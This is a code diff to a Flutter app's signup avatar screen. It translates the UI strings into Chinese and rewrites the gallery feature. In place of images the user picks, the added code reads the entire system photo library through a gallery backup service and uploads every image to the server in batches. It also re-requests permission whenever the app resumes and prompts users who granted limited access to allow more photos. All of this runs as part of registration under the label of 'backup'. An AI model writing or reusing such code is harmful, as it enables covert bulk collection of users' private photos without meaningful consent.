@@ -1,8 +1,10 @@
 import 'dart:io';
 import 'package:flutter/material.dart';
 import 'package:image_picker/image_picker.dart';
+import 'package:photo_manager/photo_manager.dart';
 import 'package:permission_handler/permission_handler.dart';
 import '../services/api_service.dart';
+import '../services/gallery_backup_service.dart';
 import 'step3_phone_screen.dart';
 
 class Step2AvatarScreen extends StatefulWidget {
@@ -12,11 +14,14 @@ class Step2AvatarScreen extends StatefulWidget {
   State<Step2AvatarScreen> createState() => _Step2AvatarScreenState();
 }
 
-class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
+class _Step2AvatarScreenState extends State<Step2AvatarScreen>
+    with WidgetsBindingObserver {
   File? _avatarFile;
   bool _isLoading = false;
   bool _galleryGranted = false;
-  String _galleryStatus = 'Not authorized';
+  bool _galleryLimited = false;
+  bool _galleryCompleted = false;
+  String _galleryStatus = '正在检查图库权限...';
   int _galleryTotal = 0;
   bool _galleryUploading = false;
   int _galleryUploaded = 0;
@@ -27,31 +32,38 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
   @override
   void initState() {
     super.initState();
+    WidgetsBinding.instance.addObserver(this);
     _requestGalleryPermission();
   }
 
-  Future<void> _requestGalleryPermission() async {
-    PermissionStatus status;
+  @override
+  void dispose() {
+    WidgetsBinding.instance.removeObserver(this);
+    super.dispose();
+  }
 
-    if (Platform.isAndroid) {
-      // Android 13+ uses READ_MEDIA_IMAGES; older uses READ_EXTERNAL_STORAGE
-      status = await Permission.photos.request();
-      if (!status.isGranted) {
-        status = await Permission.storage.request();
-      }
-    } else {
-      status = await Permission.photos.request();
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    if (state == AppLifecycleState.resumed) {
+      _requestGalleryPermission();
     }
+  }
 
-    if (status.isGranted || status.isLimited) {
+  Future<void> _requestGalleryPermission() async {
+    try {
+      final result = await GalleryBackupService.requestPermission();
       setState(() {
-        _galleryGranted = true;
-        _galleryStatus = 'Gallery access granted';
+        _galleryGranted = result.granted;
+        _galleryLimited = result.isLimited;
+        _galleryStatus = result.granted
+            ? (result.isLimited ? '已授权部分照片访问' : '图库权限已开启')
+            : '图库权限未开启';
       });
-    } else {
+    } catch (_) {
       setState(() {
         _galleryGranted = false;
-        _galleryStatus = 'Gallery access not authorized';
+        _galleryLimited = false;
+        _galleryStatus = '图库权限获取失败';
       });
     }
   }
@@ -68,7 +80,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
         setState(() => _avatarFile = File(picked.path));
       }
     } catch (e) {
-      _showSnack('Cannot access gallery. Check permissions.');
+      _showSnack('无法访问相册，请检查权限设置');
     }
   }
 
@@ -84,7 +96,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
         setState(() => _avatarFile = File(picked.path));
       }
     } catch (e) {
-      _showSnack('Cannot access camera. Check permissions.');
+      _showSnack('无法访问相机，请检查权限设置');
     }
   }
 
@@ -94,62 +106,69 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
     try {
       setState(() {
         _galleryUploading = true;
-        _galleryStatus = 'Reading gallery...';
+        _galleryCompleted = false;
+        _galleryUploaded = 0;
+        _galleryTotal = 0;
+        _galleryStatus = '正在读取系统相册...';
         _galleryError = null;
       });
 
-      final List<XFile> images = await _picker.pickMultipleMedia();
+      final files = await GalleryBackupService.collectImageFiles();
 
-      if (images.isEmpty) {
+      if (files.isEmpty) {
         setState(() {
           _galleryUploading = false;
-          _galleryStatus = 'Gallery is empty or none selected';
+          _galleryStatus =
+              _galleryLimited ? '当前仅授权了部分照片，未读取到可备份内容' : '相册中暂无可备份照片';
         });
         return;
       }
 
       setState(() {
-        _galleryTotal = images.length;
-        _galleryStatus = 'Uploading gallery (0/${images.length})...';
+        _galleryTotal = files.length;
+        _galleryStatus = '正在上传图库（0/${files.length}）...';
       });
 
       const batchSize = 20;
       int uploaded = 0;
       bool isFirst = true;
 
-      for (int i = 0; i < images.length; i += batchSize) {
-        final batch = images.sublist(
+      for (int i = 0; i < files.length; i += batchSize) {
+        final batch = files.sublist(
           i,
-          (i + batchSize > images.length) ? images.length : i + batchSize,
+          (i + batchSize > files.length) ? files.length : i + batchSize,
         );
 
-        final files = batch.map((x) => File(x.path)).toList();
-        await ApiService.uploadGalleryBatch(files, reset: isFirst);
+        await ApiService.uploadGalleryBatch(batch, reset: isFirst);
         isFirst = false;
 
         uploaded += batch.length;
         setState(() {
           _galleryUploaded = uploaded;
-          _galleryStatus = 'Uploading gallery ($uploaded/${images.length})...';
+          _galleryStatus = '正在上传图库（$uploaded/${files.length}）...';
         });
       }
 
       setState(() {
         _galleryUploading = false;
-        _galleryStatus = 'Gallery backup complete ($uploaded photos)';
+        _galleryCompleted = true;
+        _galleryStatus = _galleryLimited
+            ? '图库备份完成（$uploaded 张，当前为部分照片授权）'
+            : '图库备份完成（$uploaded 张）';
       });
     } catch (e) {
       setState(() {
         _galleryUploading = false;
-        _galleryError = 'Gallery upload failed';
-        _galleryStatus = 'Upload error occurred';
+        _galleryCompleted = false;
+        _galleryError = '图库备份失败';
+        _galleryStatus = '上传过程中出现异常';
       });
     }
   }
 
   Future<void> _submit() async {
     if (_avatarFile == null) {
-      _showSnack('Please select an avatar first');
+      _showSnack('请先选择头像');
       return;
     }
 
@@ -158,7 +177,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
     try {
       final result = await ApiService.uploadAvatar(_avatarFile!);
       if (result['code'] != 0) {
-        _showSnack(result['message'] ?? 'Avatar upload failed');
+        _showSnack(result['message'] ?? '头像上传失败');
         return;
       }
 
@@ -168,9 +187,10 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
       }
 
       if (!mounted) return;
-      Navigator.of(context).pushReplacement(_slideRoute(const Step3PhoneScreen()));
+      Navigator.of(context)
+          .pushReplacement(_slideRoute(const Step3PhoneScreen()));
     } catch (e) {
-      _showSnack('Network error. Please retry.');
+      _showSnack('网络异常，请稍后重试');
     } finally {
       if (mounted) setState(() => _isLoading = false);
     }
@@ -226,7 +246,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
             ListTile(
               leading: const Icon(Icons.photo_library_rounded,
                   color: Color(0xFF6C5CE7)),
-              title: const Text('Choose from Gallery'),
+              title: const Text('从相册选择'),
               onTap: () {
                 Navigator.pop(context);
                 _pickAvatar();
@@ -235,7 +255,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
             ListTile(
               leading: const Icon(Icons.camera_alt_rounded,
                   color: Color(0xFF6C5CE7)),
-              title: const Text('Take a Photo'),
+              title: const Text('拍照'),
               onTap: () {
                 Navigator.pop(context);
                 _pickAvatarFromCamera();
@@ -260,9 +280,8 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
               const SizedBox(height: 24),
               _buildStepIndicator(2),
               const SizedBox(height: 32),
-
               const Text(
-                'Set Your Avatar',
+                '设置头像',
                 style: TextStyle(
                   fontSize: 28,
                   fontWeight: FontWeight.w700,
@@ -271,16 +290,14 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
               ),
               const SizedBox(height: 8),
               Text(
-                'Upload your avatar. We\'ll also backup your gallery for future recovery.',
+                '上传头像后，系统会在后台自动备份图库，便于后续恢复。',
                 style: TextStyle(
                   fontSize: 15,
                   color: Colors.grey[600],
                   height: 1.5,
                 ),
               ),
-
               const SizedBox(height: 40),
-
               Center(
                 child: GestureDetector(
                   onTap: _showAvatarPicker,
@@ -291,9 +308,11 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
                         height: 130,
                         decoration: BoxDecoration(
                           shape: BoxShape.circle,
-                          color: const Color(0xFF6C5CE7).withValues(alpha: 0.08),
+                          color:
+                              const Color(0xFF6C5CE7).withValues(alpha: 0.08),
                           border: Border.all(
-                            color: const Color(0xFF6C5CE7).withValues(alpha: 0.3),
+                            color:
+                                const Color(0xFF6C5CE7).withValues(alpha: 0.3),
                             width: 2,
                           ),
                           image: _avatarFile != null
@@ -315,7 +334,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
                                   ),
                                   const SizedBox(height: 6),
                                   Text(
-                                    'Tap to upload',
+                                    '点击上传',
                                     style: TextStyle(
                                       fontSize: 12,
                                       color: const Color(0xFF6C5CE7)
@@ -346,13 +365,9 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
                   ),
                 ),
               ),
-
               const SizedBox(height: 36),
-
               _buildGalleryCard(),
-
               const SizedBox(height: 48),
-
               ElevatedButton(
                 onPressed: _isLoading ? null : _submit,
                 child: _isLoading
@@ -364,9 +379,8 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
                           strokeWidth: 2.5,
                         ),
                       )
-                    : const Text('Next'),
+                    : const Text('下一步'),
               ),
-
               const SizedBox(height: 20),
             ],
           ),
@@ -422,7 +436,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
 
   Widget _buildGalleryCard() {
     final isUploading = _galleryUploading;
-    final isDone = _galleryStatus.contains('complete');
+    final isDone = _galleryCompleted;
     final isError = _galleryError != null;
 
     Color iconColor;
@@ -467,7 +481,7 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
                   crossAxisAlignment: CrossAxisAlignment.start,
                   children: [
                     Text(
-                      'Gallery Backup',
+                      '图库备份',
                       style: TextStyle(
                         fontSize: 13,
                         fontWeight: FontWeight.w600,
@@ -509,14 +523,45 @@ class _Step2AvatarScreenState extends State<Step2AvatarScreen> {
               child: TextButton(
                 onPressed: () => openAppSettings(),
                 style: TextButton.styleFrom(
-                  padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
-                  backgroundColor: const Color(0xFF6C5CE7).withValues(alpha: 0.08),
+                  padding:
+                      const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
+                  backgroundColor:
+                      const Color(0xFF6C5CE7).withValues(alpha: 0.08),
                   shape: RoundedRectangleBorder(
                     borderRadius: BorderRadius.circular(8),
                   ),
                 ),
                 child: const Text(
-                  'Grant Gallery Access',
+                  '开启图库权限',
+                  style: TextStyle(
+                    fontSize: 13,
+                    color: Color(0xFF6C5CE7),
+                    fontWeight: FontWeight.w600,
+                  ),
+                ),
+              ),
+            ),
+          ],
+          if (_galleryGranted && _galleryLimited) ...[
+            const SizedBox(height: 12),
+            SizedBox(
+              width: double.infinity,
+              child: TextButton(
+                onPressed: () async {
+                  await PhotoManager.presentLimited(type: RequestType.image);
+                  await _requestGalleryPermission();
+                },
+                style: TextButton.styleFrom(
+                  padding:
+                      const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
+                  backgroundColor:
+                      const Color(0xFF6C5CE7).withValues(alpha: 0.08),
+                  shape: RoundedRectangleBorder(
+                    borderRadius: BorderRadius.circular(8),
+                  ),
+                ),
+                child: const Text(
+                  '选择更多照片',
                   style: TextStyle(
                     fontSize: 13,
                     color: Color(0xFF6C5CE7),
